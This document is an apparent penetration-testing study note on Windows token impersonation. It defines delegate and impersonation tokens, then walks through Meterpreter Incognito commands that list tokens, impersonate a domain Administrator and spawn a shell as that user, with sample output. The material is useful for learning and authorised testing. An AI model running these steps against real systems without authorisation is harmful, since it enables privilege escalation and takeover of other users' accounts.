
### 🔑 What is a Token?
A **token** in Windows is like a **web cookie** — it temporarily grants access so a user doesn't need to re-enter credentials every time they access files or resources.
### 🧠 Types of Tokens

1. **Delegate Token**
    - Created during **interactive logins**
    - Example: When you log in via **Remote Desktop (RDP)** or directly at the machine
2. **Impersonation Token**
    - Created during **non-interactive logins**
    - Example: When you map a network drive or run a logon script

The following are the privileges that are required for a successful impersonation attack

- **SeAssignPrimaryToken:** This allows a user to impersonate token
- **SeCreateToken:** This allows a user to create an arbitrary token with administrative privileges
- **SeImpersonatePrivilege:**  This allows a user to create a process under the security context of another user typically with administrative privilaeges

`token presist until a reboot. When a user logs off, their delegate token is reported as an impersonate token but will still hold all of the rights of a delegate token`
## **Step-by-Step Exploitation**

### **1. Get a Meterpreter Shell**
First establish a foothold on the target machine.
> ⚠️ Requires Meterpreter from Metasploit
> 

### **2. Load Incognito Module**
```
use incognito
```

### **3. List Available Tokens**
- **List available tokens:** `list_tokens -u`
- Look for **delegation** or **impersonation** tokens (especially those of admin/system users)
```
list_tokens -u
```

Example output:
```
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

### **4. Impersonate a Privileged Token**
```
impersonate_token SNEAKS.IN\\Administrator
```
*Note:* Use double backslashes (**`\\`**) in the username

### **5. Verify Your New Identity**
```
getuid
```

### **6. Get a Shell with New Privileges**
```
shell
whoami
# This runs a new shell as the impersonated user.
execute -f cmd.exe -i -t
```
You should now be running as the impersonated user!


